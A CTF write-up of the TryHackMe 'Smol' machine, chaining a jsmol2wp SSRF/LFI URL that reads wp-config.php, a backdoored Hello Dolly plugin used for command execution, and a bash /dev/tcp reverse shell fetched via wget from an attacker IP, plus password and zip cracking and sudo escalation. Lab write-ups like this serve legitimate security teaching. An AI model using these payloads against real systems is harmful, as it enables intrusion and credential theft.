🧩 Smol — TryHackMe Write-up

Difficulty: Medium
Platform: TryHackMe
Machine Name: Smol
OS: Linux

🔍 Reconnaissance
Add Host Entry
sudo nano /etc/hosts
10.66.186.187 smol.thm
🔎 Enumeration
Port Scanning (Rustscan + Nmap)
rustscan -a 10.66.186.187 -- -A
Open Ports
Port	Service	Version
22	SSH	OpenSSH 8.2p1
80	HTTP	Apache 2.4.41
🌐 Web Enumeration
Directory Brute Force
dirsearch -u http://smol.thm
Key Findings

WordPress detected

/wp-admin
/wp-login.php
/wp-content/
xmlrpc.php
wp-config.php (accessible)

🧠 WordPress Discovery
Username Enumeration

Using WPScan techniques and WordPress JSON API:

Users Found:

admin
wpuser
think
gege
diego
xavi

🔥 SSRF to wp-config.php
Vulnerable Plugin

jsmol2wp plugin (≤ 1.07)

Exploit (SSRF + LFI)
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
Credentials Extracted
DB_USER: wpuser
DB_PASSWORD: kbLSF2Vop#lw3rjDZ629*Z%G
🔐 WordPress Admin Access

Login at:

http://smol.thm/wp-admin

Credentials:

Username: wpuser
Password: kbLSF2Vop#lw3rjDZ629*Z%G
💣 Remote Code Execution
Vulnerable Plugin

Hello Dolly plugin contained a hidden backdoor allowing command execution.

Test RCE
http://www.smol.thm/wp-admin/index.php?cmd=whoami

Result:

www-data
🔄 Reverse Shell
Create Payload
nano smolshell.sh
bash -i >& /dev/tcp/10.66.100.225/1337 0>&1

Serve Payload
python3 -m http.server 8000
Listener
nc -nvlp 1337

Execute via RCE
http://www.smol.thm/wp-admin/index.php?cmd=wget http://10.66.100.225:8000/smolshell.sh
http://www.smol.thm/wp-admin/index.php?cmd=chmod 777 smolshell.sh
http://www.smol.thm/wp-admin/index.php?cmd=bash smolshell.sh

✔ Reverse shell received as www-data

🧾 Credential Dumping
Dump WordPress Users

Extracted hashes from database.

Cracked User
User: diego
Password: sandiegocalifornia
🔁 User Enumeration & Lateral Movement
Switch User
su diego
Found SSH Key
/home/think/.ssh/id_rsa
SSH as think
ssh think@smol.thm -i id_rsa
📦 Cracking wordpress.old.zip
Transfer File
wget http://victim_ip:8000/wordpress.old.zip
Crack Zip Password
zip2john wordpress.old.zip > wp_hash.txt
john wp_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

🔑 Xavi Credentials

From extracted wp-config.php:

DB_USER: xavi
DB_PASSWORD: P@ssw0rdxavi@
🚀 Privilege Escalation
Switch to Xavi
su xavi
Check Sudo Permissions
sudo -l
(ALL : ALL) ALL
Root Access
sudo su
🏁 Root Flag
cat /root/root.txt
bf89ea3ea01992353aef1f576214d4e4
🔗 Attack Chain Summary
SSRF → wp-config.php → WP Admin
→ Hello Dolly RCE → Reverse Shell
→ Hash Dump → User Pivoting
→ Zip Crack → Credential Reuse
→ Sudo Misconfiguration → Root
✅ Conclusion

This machine demonstrates how minor WordPress plugin vulnerabilities, when chained together, can lead to full system compromise.
Key takeaways include:

Plugin security is critical

Credential reuse is dangerous

Sudo misconfigurations are fatal
